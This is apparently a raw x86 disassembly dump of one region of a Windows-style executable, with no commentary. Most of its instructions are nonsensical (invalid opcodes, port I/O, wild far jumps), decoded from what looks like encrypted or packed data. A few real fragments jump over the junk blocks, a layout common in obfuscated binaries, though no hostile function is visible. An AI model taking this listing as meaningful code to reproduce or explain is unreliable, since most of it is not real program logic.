  407a4c:	js     0x407a9f
  407a4e:	in     eax,0x45
  407a50:	ins    BYTE PTR es:[edi],dx
  407a51:	ret    0x3e39
  407a54:	pop    ebp
  407a55:	xor    al,0x24
  407a57:	and    bh,BYTE PTR [ecx-0x21]
  407a5a:	ins    DWORD PTR es:[edi],dx
  407a5b:	pop    edi
  407a5c:	mov    edi,0x913090d4
  407a61:	shl    BYTE PTR [edx-0x3119bcd8],1
  407a67:	call   FWORD PTR [ecx-0x998baf5]
  407a6d:	icebp  
  407a6e:	mov    al,0x1a
  407a70:	fld    TBYTE PTR [esi+0x32]
  407a73:	adc    DWORD PTR [ebx+eiz*2+0x43],edx
  407a77:	jnp    0x407a2b
  407a79:	xchg   ebp,eax
  407a7a:	xchg   edx,eax
  407a7b:	mov    WORD PTR [edi-0x6a2711dd],gs
  407a81:	fnstsw WORD PTR [edx-0x63]
  407a84:	cmp    eax,DWORD PTR [ebp+0x2d]
  407a87:	mov    al,0x79
  407a89:	or     eax,0x7ca43387
  407a8e:	sbb    DWORD PTR [esi-0x7e],ecx
  407a91:	into   
  407a92:	pop    ecx
  407a93:	add    dh,ch
  407a95:	rcr    DWORD PTR [ebp-0x532af802],1
  407a9b:	dec    eax
  407a9c:	retf   
  407a9d:	bound  edx,QWORD PTR [esi]
  407a9f:	(bad)  
  407aa1:	dec    ecx
  407aa2:	in     al,dx
  407aa3:	out    dx,eax
  407aa4:	aaa    
  407aa5:	aad    0x5b
  407aa7:	add    bh,BYTE PTR [edi-0x6d]
  407aaa:	jb     0x407b03
  407aac:	arpl   di,bp
  407aae:	cmp    dh,BYTE PTR [eax]
  407ab0:	fsub   st,st(7)
  407ab2:	and    bh,ch
  407ab4:	jmp    0xec9a052c
  407ab9:	jae    0x407a89
  407abb:	stos   BYTE PTR es:[edi],al
  407abc:	sbb    DWORD PTR [edx-0x32],0xd5e36b91
  407ac3:	add    eax,0x2603b6b9
  407ac8:	push   ss
  407ac9:	cmp    eax,0x3c1acfb0
  407ace:	lahf   
  407acf:	int    0x83
  407ad1:	test   al,0xa4
  407ad3:	cmp    BYTE PTR [esi+0x35],0xed
  407ad7:	cmp    DWORD PTR [esi],ebx
  407ad9:	(bad)  
  407ada:	in     al,dx
  407adb:	out    dx,al
  407adc:	(bad)  
  407add:	fcmovne st,st(5)
  407adf:	jmp    0xa5ad8a87
  407ae4:	sub    edi,DWORD PTR ds:0x5b2fb3d8
  407aea:	fild   WORD PTR [ecx+eax*8-0x26681938]
  407af1:	sti    
  407af2:	dec    edi
  407af3:	adc    DWORD PTR [ebx-0x38],edi
  407af6:	jmp    0x16a389a6
  407afb:	arpl   bp,ax
  407afd:	lds    edi,FWORD PTR [edx-0x63269cb6]
  407b03:	sub    dh,ch
  407b05:	aas    
  407b06:	and    al,0xce
  407b08:	jle    0x407b45
  407b0a:	add    esi,DWORD PTR [edi-0x6a]
  407b0d:	jmp    0xed25:0xed5a21d
  407b14:	ds xor eax,esi
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	imul   edx,esp,0xffffff97
  407b42:	mov    edx,0x7070c957
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b60
  407b4c:	iret   
  407b4d:	pop    ecx
  407b4e:	int    0xde
  407b50:	cmp    BYTE PTR ds:0x52ffd767,0x66
  407b57:	pop    ebp
  407b58:	pop    es
  407b59:	out    dx,eax
  407b5a:	and    eax,0xce09f434
  407b5f:	pop    edx
  407b60:	cmp    eax,0x2ca06b41
  407b65:	xchg   ebx,eax
  407b66:	fsub   DWORD PTR [esi]
  407b68:	fs aaa 
  407b6a:	(bad)  
  407b6b:	pop    ebx
  407b6c:	je     0x407afc
  407b6e:	in     al,dx
  407b6f:	pop    ebp
  407b70:	mov    dl,0x8d
  407b72:	xchg   ebp,eax
  407b73:	and    cl,BYTE PTR [ebp-0x3f]
  407b76:	fdivr  DWORD PTR [esi+0x44]
  407b79:	test   edi,edi
  407b7b:	inc    ebp
  407b7c:	mov    ah,0x6c
  407b7e:	push   ds
  407b7f:	cmp    BYTE PTR [ebx+edx*2-0x60],dh
  407b83:	mov    dh,0xd3
  407b85:	mov    edi,DWORD PTR [ebp-0x56]
  407b88:	cmp    eax,ebp
  407b8a:	cwde   
  407b8b:	dec    esp
  407b8c:	ins    DWORD PTR es:[edi],dx
  407b8d:	sbb    al,0xd6
  407b8f:	and    dh,BYTE PTR [ebp+0x24]
  407b92:	hlt    
  407b93:	cmp    DWORD PTR [ebx],0xfffffff6
  407b96:	test   DWORD PTR [ecx-0x76],0xf502b05d
  407b9d:	int3   
  407b9e:	xchg   BYTE PTR [ecx+0x0],ah
  407ba1:	add    BYTE PTR [ebx],bl
  407ba3:	pop    es
  407ba4:	pop    ds
  407ba5:	clc    
  407ba6:	outs   dx,DWORD PTR ds:[esi]
  407ba7:	xacquire xchg DWORD PTR [ebp+0x74],edi
  407bab:	mul    DWORD PTR [ecx]
  407bad:	enter  0x5e2c,0x45
  407bb1:	ins    DWORD PTR es:[edi],dx
  407bb2:	mov    cl,0xb3
  407bb4:	ins    DWORD PTR es:[edi],dx
  407bb5:	pop    ebp
  407bb6:	and    DWORD PTR [ecx+0x3227895f],0xffffffc9
  407bbd:	mov    al,ds:0xc8c1a1
  407bc2:	sbb    eax,0x42997cd6
  407bc7:	not    eax
  407bc9:	adc    eax,0x52f15b9c
  407bce:	mov    al,0xa0
  407bd0:	and    eax,0x627dc627
  407bd5:	pop    edi
  407bd6:	cmp    ah,BYTE PTR [ebx]
  407bd8:	push   ebx
  407bd9:	sub    edx,DWORD PTR [ecx+ecx*2-0x15167fbc]
  407be0:	add    ecx,DWORD PTR [ecx]
  407be2:	dec    ebx
  407be3:	xchg   edi,eax
  407be4:	pusha  
  407be5:	leave  
  407be6:	pop    es
  407be7:	sbb    eax,0xc0dff471
  407bed:	adc    ebx,DWORD PTR [edx]
  407bef:	add    BYTE PTR [esi+0xbe7e96d],ch
  407bf5:	pop    edi
  407bf6:	into   
  407bf7:	push   ebx
  407bf8:	dec    esi
  407bf9:	pop    esp
  407bfa:	inc    ebx
  407bfb:	mov    ebx,DWORD PTR [ecx]
  407bfd:	jl     0x407c74
  407bff:	cld    
  407c00:	inc    esp
  407c01:	loopne 0x407ba5
  407c03:	add    bl,bl
  407c05:	or     BYTE PTR [ebx],ah
  407c07:	iret   
  407c08:	inc    edx
  407c09:	into   
  407c0a:	add    dh,dl
  407c0c:	jno    0x407c06
  407c0e:	out    dx,al
  407c0f:	xchg   ebx,eax
  407c10:	sub    al,BYTE PTR [edi]
  407c12:	repnz mov eax,ds:0x19ae4bb0
  407c18:	std    
  407c19:	scas   eax,DWORD PTR es:[edi]
  407c1a:	dec    ecx
  407c1b:	and    eax,0xf12662d1
  407c20:	xor    dl,cl
  407c22:	outs   dx,BYTE PTR ds:[esi]
  407c23:	out    dx,eax
  407c24:	lahf   
  407c25:	jnp    0x407bc2
  407c27:	sbb    eax,0x45863989
  407c2c:	icebp  
  407c2d:	mov    dh,0x52
  407c2f:	dec    edi
  407c30:	jo     0x407bc8
  407c32:	xchg   ebx,eax
  407c33:	cmp    edi,eax
  407c35:	lahf   
  407c36:	and    al,0x92
  407c38:	fwait
  407c39:	sbb    al,0xee
  407c3b:	inc    edi
  407c3c:	and    DWORD PTR [edx-0x369c49ec],0xda688eb3
  407c46:	addr16 repz fcmovbe st,st(2)
  407c4a:	ficom  WORD PTR [ebp+esi*8+0x39d2d991]
  407c51:	mov    eax,ds:0xa197c733
  407c56:	pop    edx
  407c57:	pop    eax
  407c58:	push   cs
  407c59:	out    dx,al
  407c5a:	call   0xaae425f7
  407c5f:	mov    esp,0xdec7720
  407c64:	mov    edi,0xa29dc626
  407c69:	fcmovbe st,st(7)
  407c6b:	mov    dl,0xc5
  407c6d:	inc    edx
  407c6e:	aaa    
  407c6f:	mov    cl,0x10
  407c71:	jecxz  0x407c0a
  407c73:	dec    edx
  407c74:	int3   
  407c75:	cld    
  407c76:	hlt    
  407c77:	sub    bl,al
  407c79:	loope  0x407c63
  407c7b:	dec    esp
  407c7c:	inc    BYTE PTR [ecx+ebp*4-0x47223f2b]
  407c83:	fisttp WORD PTR [ebx+0x53]
  407c86:	sbb    ebx,eax
  407c88:	imul   edx,DWORD PTR [ecx+0xe],0x50
  407c8c:	nop
  407c8d:	cdq    
  407c8e:	mov    esi,DWORD PTR [esi]
  407c90:	xchg   BYTE PTR [esp+ebx*8],al
  407c93:	pop    esi
  407c94:	adc    al,0x54
  407c96:	bound  eax,QWORD PTR [ebx]
  407c98:	call   0x81ae1d02
  407c9d:	outs   dx,BYTE PTR ds:[esi]
  407c9e:	sub    al,0x84
  407ca0:	nop
  407ca1:	ret    0x9322
  407ca4:	inc    ecx
  407ca5:	mov    ch,0x28
  407ca7:	fbstp  TBYTE PTR [ebp-0x34a10686]
  407cad:	sti    
  407cae:	or     DWORD PTR [ecx-0x37363790],ebx
  407cb4:	loopne 0x407d12
  407cb6:	push   es
  407cb7:	mov    ecx,0x4d7a4ccf
  407cbc:	and    ebp,DWORD PTR [eax+ebp*8-0x25e50ed0]
  407cc3:	sub    edi,ecx
  407cc5:	push   ebp
  407cc6:	inc    ecx
  407cc7:	mov    ds:0xebc78a23,al
  407ccc:	lds    esi,FWORD PTR [eax+0x45]
  407ccf:	xchg   al,ch
  407cd1:	add    DWORD PTR [ecx+0x4a],eax
  407cd4:	in     al,dx
  407cd5:	test   eax,0xe891fec6
  407cda:	jp     0x407d49
  407cdc:	pop    ebp
  407cdd:	lock in al,0xe6
  407ce0:	nop
  407ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ce2:	loopne 0x407cb2
  407ce4:	mov    edx,0x51c5d8f2
  407ce9:	lds    esp,FWORD PTR [esi]
  407ceb:	mov    bl,0x98
  407ced:	adc    BYTE PTR [edi],bl
  407cef:	fwait
  407cf0:	mov    eax,0x4df8cb20
  407cf5:	ficom  WORD PTR [eax+ebx*8]
  407cf8:	mov    dh,dl
  407cfa:	std    
  407cfb:	cwde   
  407cfc:	mov    ?,WORD PTR [ebp-0x177429dc]
  407d02:	jne    0x407d21
  407d04:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407d06:	jp     0x407d3c
  407d08:	clc    
  407d09:	ja     0x407cfc
  407d0b:	mov    esi,0xe7e301d4
  407d10:	popf   
  407d11:	cmp    ecx,DWORD PTR [eax+edx*1+0x24d2765f]
  407d18:	jl     0x407caf
  407d1a:	ins    BYTE PTR es:[edi],dx
  407d1b:	xchg   esp,eax
  407d1c:	jb     0x407cf6
  407d1e:	cmp    al,0xea
  407d20:	(bad)  [ecx-0x7]
  407d23:	jne    0x407d12
  407d25:	clc    
  407d26:	mov    cl,0x9f
  407d28:	push   ecx
  407d29:	xchg   ebp,eax
  407d2a:	dec    esp
  407d2b:	ds jecxz 0x407ce1
  407d2e:	aaa    
  407d2f:	shl    BYTE PTR [ebp-0x60bfa84d],cl
  407d35:	sti    
  407d36:	(bad)  
  407d38:	xor    edx,DWORD PTR [eax+0x7775281a]
  407d3e:	addr16 out dx,eax
  407d40:	sar    DWORD PTR [ecx+ecx*1+0x49],0x0
  407d45:	leave  
  407d46:	mov    esp,0x867517de
  407d4b:	cmp    BYTE PTR [ecx+0x3dbd7727],bl
  407d51:	fwait
  407d52:	or     eax,0xfef642ab
  407d57:	clc    
  407d58:	mov    esp,0xd7214b9b
  407d5d:	outs   dx,DWORD PTR ds:[esi]
  407d5e:	cmp    eax,DWORD PTR [esi-0x31]
  407d61:	pusha  
  407d62:	je     0x407d71
  407d64:	leave  
  407d65:	fldenv ds:0x4b344e6d
  407d6b:	mov    DWORD PTR [eax-0x35],0x1b84b624
  407d72:	pop    es
  407d73:	rcl    BYTE PTR [edx-0x2feaea92],0x44
  407d7a:	outs   dx,DWORD PTR ds:[esi]
  407d7b:	push   edx
  407d7c:	cmp    esp,DWORD PTR [ebx+eax*4-0x3ec0d8e5]
  407d83:	add    eax,0xffffff82
  407d86:	and    eax,0xff2e23f3
  407d8b:	loopne 0x407d1d
  407d8d:	outs   dx,DWORD PTR ds:[esi]
  407d8e:	sub    eax,esp
  407d90:	push   ss
  407d91:	xor    al,0x1
  407d93:	(bad)  [ebx-0x7c]
  407d96:	xchg   edi,eax
  407d97:	clc    
  407d98:	mov    dh,0xbf
  407d9a:	dec    edx
  407d9b:	repz mov ebx,DWORD PTR [ecx]
  407d9e:	jg     0x407d84
  407da0:	xor    DWORD PTR [edi],0x34c211d7
  407da6:	and    edx,esp
  407da8:	jmp    DWORD PTR [eax-0x2d6ba61a]
  407dae:	sbb    dl,BYTE PTR [ebp+ebp*8-0xf093729]
  407db5:	clc    
  407db6:	je     0x407d6b
  407db8:	xchg   DWORD PTR [edx+ebp*4+0x40],edx
  407dbc:	dec    eax
  407dbd:	(bad)  
  407dbf:	sub    ebp,DWORD PTR [esi-0x7f022cd2]
  407dc5:	fsub   DWORD PTR [ebx-0x50]
  407dc8:	cli    
  407dc9:	adc    DWORD PTR [edx+0x11f0ee12],edi
  407dcf:	sub    DWORD PTR [edi+edi*2],0xffffffe1
  407dd3:	mov    ebp,0xe8a523b0
  407dd8:	mov    ds:0x6ee496de,al
  407ddd:	ja     0x407dec
  407ddf:	pop    ebx
  407de0:	push   ebx
  407de1:	jl     0x407d95
  407de3:	leave  
  407de4:	(bad)  
  407de5:	into   
  407de6:	cdq    
  407de7:	stos   DWORD PTR es:[edi],eax
  407de8:	mov    ebx,0x32064583
  407ded:	les    esp,FWORD PTR [ebp-0x6]
  407df0:	data16 stos BYTE PTR es:[edi],al
  407df2:	jmp    0xe97c9245
  407df7:	cwde   
  407df8:	xor    al,0xee
  407dfa:	xchg   ebp,eax
  407dfb:	ror    BYTE PTR [ecx],1
  407dfd:	inc    edi
  407dfe:	test   eax,0x84d80338
  407e03:	outs   dx,DWORD PTR ds:[esi]
  407e04:	out    dx,al
  407e05:	lods   eax,DWORD PTR ds:[esi]
  407e06:	adc    esi,DWORD PTR [edx+0x3f4faef]
  407e0c:	xchg   ecx,eax
  407e0d:	scas   al,BYTE PTR es:[edi]
  407e0e:	jl     0x407e13
  407e10:	or     eax,0xe4cd9b28
  407e15:	cmp    al,0xd8
  407e17:	std    
  407e18:	ds jmp 0xa31f2216
  407e1e:	popf   
  407e1f:	in     al,0x23
  407e21:	outs   dx,WORD PTR ds:[esi]
  407e23:	pusha  
  407e24:	shr    esi,1
  407e26:	adc    BYTE PTR [ebx+0x54],dh
  407e29:	aaa    
  407e2a:	pmuludq mm0,QWORD PTR [ecx]
  407e2d:	addr16 call 0x9:0x4bc49918
  407e35:	pop    esp
  407e36:	cli    
  407e37:	mov    bl,0x7d
  407e39:	xor    BYTE PTR [eax],al
  407e3b:	into   
  407e3c:	xrelease mov DWORD PTR [edx+0x57],edx
  407e40:	mov    eax,ds:0x97970327
  407e45:	mov    bh,0x91
  407e47:	pop    es
  407e48:	arpl   WORD PTR [ebx],cx
  407e4a:	inc    ecx
  407e4b:	mov    WORD PTR [ebp-0x55],gs
  407e4e:	out    dx,eax
  407e4f:	xchg   esi,eax
  407e50:	scas   eax,DWORD PTR es:[edi]
  407e51:	mov    DWORD PTR [ebx+0x4d],esp
  407e54:	scas   eax,DWORD PTR es:[edi]
  407e55:	jne    0x407ed0
  407e57:	add    BYTE PTR [edi+0x1a],dh
  407e5a:	jno    0x407ec0
  407e5c:	loope  0x407e26
  407e5e:	fist   WORD PTR [edi]
  407e60:	lods   eax,DWORD PTR ds:[esi]
  407e61:	cmp    ch,bh
  407e63:	sub    edx,DWORD PTR [ebx]
  407e65:	mov    BYTE PTR [ebx+0x55],bl
  407e68:	push   edi
  407e69:	pop    edx
  407e6a:	jge    0x407ea0
  407e6c:	or     DWORD PTR [edx+0x1ed8dc6c],esi
  407e72:	fimul  WORD PTR [ebx+0x32de6b5b]
  407e78:	xor    DWORD PTR [edx-0x5dc4173f],ecx
  407e7e:	add    BYTE PTR [eax],al
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	xchg   DWORD PTR [ecx+0x36],esp
  407e9b:	cmp    BYTE PTR [edi],al
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407e45
  407ea5:	xchg   ecx,eax
  407ea6:	retf   0x2085
  407ea9:	aas    
  407eaa:	aam    0x3c
  407eac:	(bad)  
  407ead:	pop    ebx
  407eae:	fnsave [ecx]
  407eb0:	xchg   edx,eax
  407eb1:	dec    edx
  407eb2:	pop    esp
  407eb3:	mov    bl,0x62
  407eb5:	call   0x143:0x43338be
  407ebc:	ins    DWORD PTR es:[edi],dx
  407ebd:	xchg   ecx,eax
  407ebe:	data16 lods al,BYTE PTR ds:[esi]
  407ec0:	jmp    0xdc27f35b
  407ec5:	sub    ebx,DWORD PTR [edx-0x4ea28337]
  407ecb:	sbb    ebp,edx
  407ecd:	cmp    ch,cl
  407ecf:	fisttp DWORD PTR [edx-0x36]
  407ed2:	sub    esp,edi
  407ed4:	sbb    BYTE PTR [edi+0x14],al
  407ed7:	call   0xcd58b477
  407edc:	push   esp
  407edd:	hlt    
  407ede:	or     edx,DWORD PTR [esi-0x4712d75c]
  407ee4:	and    bh,dh
  407ee6:	xchg   ebx,eax
  407ee7:	pop    eax
  407ee8:	xlat   BYTE PTR ds:[ebx]
  407ee9:	dec    ebx
  407eea:	ja     0x407eae
  407eec:	into   
  407eed:	std    
  407eee:	and    al,BYTE PTR [ebx+0x1b]
  407ef1:	push   edx
  407ef2:	ror    DWORD PTR [edi+edi*2-0x6bdde9f2],0x33
  407efa:	add    eax,0xa80b952b
  407eff:	dec    esp
  407f00:	pop    ebx
  407f01:	sbb    eax,0x402c9731
  407f06:	scas   eax,DWORD PTR es:[edi]
  407f07:	add    BYTE PTR [ecx-0x7c2ec29c],0xa7
  407f0e:	mov    bl,0xf1
  407f10:	lods   eax,DWORD PTR ds:[esi]
  407f11:	mov    ds,esi
  407f13:	dec    ebx
  407f14:	jp     0x407f37
  407f16:	sti    
  407f17:	push   edx
  407f18:	lahf   
  407f19:	or     ecx,ebx
  407f1b:	in     al,0x4c
  407f1d:	jbe    0x407ef0
  407f1f:	loop   0x407ef3
  407f21:	or     ch,bh
  407f23:	popa   
  407f24:	fmul   QWORD PTR [ebx+edx*8]
  407f27:	pop    ecx
  407f28:	inc    ebp
  407f29:	scas   eax,DWORD PTR es:[edi]
  407f2a:	lds    esp,FWORD PTR [eax+0x489d6c67]
  407f30:	cmp    DWORD PTR [eax+0x7fd14d1d],esp
  407f36:	test   eax,0xebf2827e
  407f3b:	pop    edi
  407f3c:	xor    eax,0x86e19fff
  407f41:	call   0x6e1f1ce2
  407f46:	pop    eax
  407f47:	push   ebp
  407f48:	mov    al,ds:0x79b24951
  407f4d:	pop    eax
  407f4e:	jns    0x407edd
  407f50:	xor    BYTE PTR [ecx+0x24877be8],dl
  407f56:	cwde   
  407f57:	hlt    
  407f58:	mov    al,ds:0x303a1509
  407f5d:	mov    esi,0x73d579d6
  407f62:	fs mov dh,0x25
  407f65:	push   ebp
  407f66:	pop    esp
  407f67:	push   esi
  407f68:	xor    al,0xed
  407f6a:	mov    bl,0x37
  407f6c:	fild   WORD PTR [edi+0x6dcb0b88]
  407f72:	push   esi
  407f73:	fadd   DWORD PTR [ebx-0x7a]
  407f76:	mov    eax,0x1166db7f
  407f7b:	pop    ds
  407f7c:	mov    dh,0xa4
  407f7e:	ror    BYTE PTR [eax-0x4c13b9f3],cl
  407f84:	jge    0x407f63
  407f86:	loopne 0x407ff5
  407f88:	call   0x62079cb2
  407f8d:	js     0x407f4b
  407f8f:	push   ds
  407f90:	das    
  407f91:	das    
  407f92:	in     eax,0x5e
  407f94:	sbb    al,0x85
  407f96:	sbb    eax,0x64309814
  407f9b:	mov    al,ds:0x70310bff
  407fa0:	loope  0x407f84
  407fa2:	lds    ebx,FWORD PTR [ebx-0x32bed696]
  407fa8:	mov    cs,WORD PTR [esi-0xd22a506]
  407fae:	(bad)  [ebx+0x75]
  407fb1:	dec    esi
  407fb2:	jo     0x407f3d
  407fb4:	(bad)  
  407fb5:	jnp    0x407fb2
  407fb7:	dec    eax
  407fb8:	adc    cl,bh
  407fba:	(bad)  
  407fbb:	jo     0x407fc3
  407fbd:	push   cs
  407fbe:	sub    ecx,0x2b
  407fc1:	xchg   ebx,eax
  407fc2:	pop    ebx
  407fc3:	or     al,BYTE PTR [esi-0x27433fbe]
  407fc9:	ins    DWORD PTR es:[edi],dx
  407fca:	popa   
  407fcb:	push   ecx
  407fcc:	in     al,0x39
  407fce:	fisub  DWORD PTR [ecx+0x3c]
  407fd1:	leave  
  407fd2:	stc    
  407fd3:	jbe    0x407f5e
  407fd5:	jmp    0x407ffe
  407fd7:	mov    bh,BYTE PTR [edi*2-0x250bbfe6]
  407fde:	ins    BYTE PTR es:[edi],dx
  407fdf:	test   BYTE PTR [ebx+0x57321fc0],bl
  407fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fe6:	inc    edx
  407fe7:	inc    esi
  407fe8:	shl    DWORD PTR [ebx+0x6bbbeb63],0xe3
  407fef:	sub    eax,0x859b0f2
  407ff4:	mov    esi,DWORD PTR [edi+ecx*2+0x13c22191]
  407ffb:	loopne 0x407fd3
  407ffd:	inc    esp
  407ffe:	cmc    
  407fff:	sti    
  408000:	outs   dx,DWORD PTR ds:[esi]
  408001:	out    0xbc,eax
  408003:	pop    eax
  408004:	jg     0x40802d
  408006:	imul   ebp,DWORD PTR [ebx+0x4a],0xffffffae
  40800a:	test   eax,0xf8a2aeff
  40800f:	(bad)  
  408010:	je     0x408035
  408012:	ja     0x40804a
  408014:	add    dh,bl
  408016:	and    DWORD PTR [eax+0x14],edi
  408019:	sar    DWORD PTR ss:[eax+ebx*8-0x410f38b0],1
  408021:	mov    DWORD PTR [esi-0x23],esp
  408024:	hlt    
  408025:	jne    0x408027
  408027:	sbb    DWORD PTR [edx],eax
  408029:	xor    ah,BYTE PTR [ecx+edx*8+0x2452a983]
  408030:	lock gs cwde 
  408033:	jbe    0x40807e
  408035:	mov    dl,0x76
  408037:	fcomi  st,st(0)
  408039:	ds dec esi
  40803b:	push   cs
  40803c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40803d:	inc    edi
  40803e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40803f:	dec    esi
  408040:	mov    bl,0xa5
  408042:	fmul   QWORD PTR [ebp-0x3cc95be7]
  408048:	fistp  QWORD PTR [eax-0x10]
  40804b:	fldcw  WORD PTR [eax+0x285d371b]
  408051:	lea    edi,[ebx+0x1a]
  408054:	fld    QWORD PTR [edi-0x4dcd66d6]
  40805a:	xor    cl,0xfe
  40805d:	pop    ecx
  40805e:	sbb    al,0xbb
  408060:	pusha  
  408061:	and    ebp,esp
  408063:	cmp    BYTE PTR [ebp-0x7c],cl
  408066:	in     al,dx
  408067:	leave  
  408068:	adc    al,0xd8
  40806a:	dec    ebp
  40806b:	(bad)  
  40806c:	push   edi
  40806d:	out    dx,eax
  40806e:	int    0x63
  408070:	imul   ecx,DWORD PTR [ebp-0x21],0xfffffff7
  408074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408075:	mov    al,ds:0x4d339d4a
  40807a:	mov    WORD PTR [ecx-0x4ac6566f],gs
  408080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408081:	sar    bl,cl
  408083:	jmp    0xe95c:0xffb7b577
  40808a:	cmp    esi,ebx
  40808c:	lods   al,BYTE PTR ds:[esi]
  40808d:	mov    edx,0x6a797815
  408092:	cwde   
  408093:	cmp    eax,0xd5bb8040
  408098:	cs adc al,0xa5
  40809b:	xchg   ebx,eax
  40809c:	xchg   edx,eax
  40809d:	(bad)  
  40809e:	je     0x408067
  4080a0:	retf   0x4a55
  4080a3:	ins    DWORD PTR es:[edi],dx
  4080a4:	mov    al,ds:0xe7b6a94c
  4080a9:	pop    ebx
  4080aa:	ds rcl esp,cl
  4080ad:	loope  0x4080b0
  4080af:	lahf   
  4080b0:	xchg   ecx,eax
  4080b1:	data16 xor al,bh
  4080b4:	scas   al,BYTE PTR es:[edi]
  4080b5:	movups xmm1,XMMWORD PTR [edx+0x7c1466b9]
  4080bc:	jae    0x4080b3
  4080be:	mov    edi,0x148aebeb
  4080c3:	xor    esp,DWORD PTR [esi-0x72e07580]
  4080c9:	xor    DWORD PTR [edx-0x630b6577],0x947dd1c2
  4080d3:	push   0xbffa7fc5
  4080d8:	and    BYTE PTR [ebp+0x4ca29cc],dh
  4080de:	cmp    al,al
  4080e0:	cld    
  4080e1:	loope  0x4080cb
  4080e3:	mov    ebp,0x41c4c7da
  4080e8:	icebp  
  4080e9:	sub    al,0x6f
  4080eb:	cmp    BYTE PTR [ecx],dl
  4080ed:	push   esi
  4080ee:	pop    ds
  4080ef:	popf   
  4080f0:	xor    al,0x4a
  4080f2:	stc    
  4080f3:	xlat   BYTE PTR ds:[ebx]
  4080f4:	loop   0x408113
  4080f6:	mov    cl,0xce
  4080f8:	pop    esi
  4080f9:	jle    0x408109
  4080fb:	push   ds
  4080fc:	jae    0x4080de
  4080fe:	jae    0x408098
  408100:	jecxz  0x4080f1
  408102:	shl    BYTE PTR [ebx+0x25c2b24e],0xc1
  408109:	sub    BYTE PTR [eax],al
  40810b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40810c:	mov    ebx,0x629324bc
  408111:	mov    eax,ds:0x1cb75c18
  408116:	sub    al,0x40
  408118:	mov    dh,0xc
  40811a:	(bad)  
  40811b:	pop    eax
  40811c:	ret    
  40811d:	xchg   bh,ah
  40811f:	push   0x265ed728
  408124:	push   esi
  408125:	push   ebp
  408126:	mov    esi,0x7dd0913f
  40812b:	inc    ebp
  40812c:	in     eax,0x5
  40812e:	js     0x4081a1
  408130:	pushf  
  408131:	pop    esp
  408132:	jns    0x40815f
  408134:	popa   
  408135:	gs jbe 0x4080e5
  408138:	sbb    cl,dh
  40813a:	cdq    
  40813b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40813c:	mov    cl,0xb5
  40813e:	fistp  DWORD PTR [edx-0x1c]
  408141:	ror    DWORD PTR [ebp-0x3a],0xc3
  408145:	mov    eax,0x446a53e0
  40814a:	mov    edx,DWORD PTR [ebx+0x50]
  40814d:	lods   al,BYTE PTR ds:[esi]
  40814e:	test   eax,0xb78f620a
  408153:	rcr    DWORD PTR [ebx-0x5188a27c],cl
  408159:	leave  
  40815a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40815b:	popf   
  40815c:	ret    
  40815d:	push   0x20
  40815f:	iret   
  408160:	dec    esi
  408161:	push   eax
  408162:	fst    DWORD PTR [eax]
  408164:	smsw   WORD PTR [eax]
  408167:	add    bh,bl
  408169:	(bad)  
  40816a:	xor    al,0x87
  40816c:	push   ds
  40816d:	push   ebx
  40816e:	call   0xe04f479d
  408173:	sbb    DWORD PTR [ebx],0xbaed47e6
  408179:	bound  edx,QWORD PTR [esi]
  40817b:	mov    dh,0xa4
  40817d:	shl    BYTE PTR [edi-0x3f],1
  408180:	add    al,0x92
  408182:	std    
  408183:	xchg   edx,eax
  408184:	mov    ds:0xb66249b0,al
  408189:	les    ebp,FWORD PTR [esi+0x2d]
  40818c:	xlat   BYTE PTR ds:[ebx]
  40818d:	jecxz  0x40817d
  40818f:	cmp    eax,0xf1ce0299
  408194:	xor    bh,BYTE PTR [ecx+0x1dfab41c]
  40819a:	jmp    0x4081aa
  40819c:	in     eax,dx
  40819d:	mov    ebx,0x79e5d27d
  4081a2:	sub    DWORD PTR [ebx-0x76c19d8d],ecx
  4081a8:	je     0x4081cd
  4081aa:	fimul  DWORD PTR [esi-0x3c]
  4081ad:	push   ds
  4081ae:	fnstsw WORD PTR [edi]
  4081b0:	mov    bh,ch
  4081b2:	aam    0x71
  4081b4:	imul   edi,DWORD PTR ds:0xb9a0979f,0x40
  4081bb:	jle    0x4081fe
  4081bd:	sbb    cl,BYTE PTR [eax+0x6b009cc7]
  4081c3:	dec    esi
  4081c4:	out    0xbf,al
  4081c6:	lds    edx,FWORD PTR [ebp-0x46]
  4081c9:	add    BYTE PTR [ecx-0x6cf5cdb],dl
  4081cf:	mov    edi,0xc45217e7
  4081d4:	lea    eax,[ebp+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
